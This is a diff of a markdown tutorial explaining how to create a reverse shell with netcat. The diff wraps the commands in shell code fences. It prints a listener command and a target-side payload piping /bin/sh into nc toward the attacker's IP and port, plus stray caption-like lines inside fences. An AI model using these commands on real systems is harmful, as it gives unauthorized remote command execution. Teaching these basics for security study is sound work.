@@ -14,25 +14,28 @@ Generally, in order to hack into a system, an attacker tries to gain shell acces
 
 Creating Reverse Shells
 ### 1. Setup a listener: The very first step is to set up a listener on the attacker’s machine in order to act as a server and to listen to the incoming connections. Use the following command to start listening.
-
+```shell
 nc –nlvp 5555
+```
 Replace the port number 5555 with the port you want to receive the connection on.
-
+```shell
 netcat-listen
-
+```
 
 
 This will start the listener on the port 5555.
 
 ### 2. Receive connection along with a shell from target: Now as we have started listening, it’s time to execute a basic payload at the target so that we could get a reverse shell. Use the following command to send the request to the attacker.
-
+```shell
 /bin/sh | nc 127.0.0.1 5555
+```
 Replace 127.0.0.1 with the host IP of the attacker and 5555 with the attacker’s port.
-
+```shell
 netcat-connect
-
+```
 This will give a reverse shell to the attacker which attacker could use to execute any command.
 
 ### 3. Executing a command through shell: Now if we enter any command at the receiver’s terminal the output would be displayed on the attacker’s terminal.
-
+```shell
 netcat-live-reverse-shell
+```shell
